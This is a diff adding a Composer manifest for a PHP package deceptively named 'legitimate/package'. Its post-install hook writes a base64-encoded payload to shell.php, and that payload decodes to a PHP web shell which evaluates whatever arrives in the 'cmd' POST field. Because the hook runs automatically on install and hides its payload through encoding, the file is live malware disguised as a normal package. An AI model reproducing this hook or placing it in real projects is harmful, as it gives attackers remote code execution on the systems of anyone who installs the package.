@@ -1,0 +1,11 @@
+{
+    "name": "legitimate/package",
+    "require": {
+        "php": ">=7.0"
+    },
+    "scripts": {
+        "post-install-cmd": [
+            "php -r \"file_put_contents('shell.php', base64_decode('PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg=='));\""
+        ]
+    }
+}
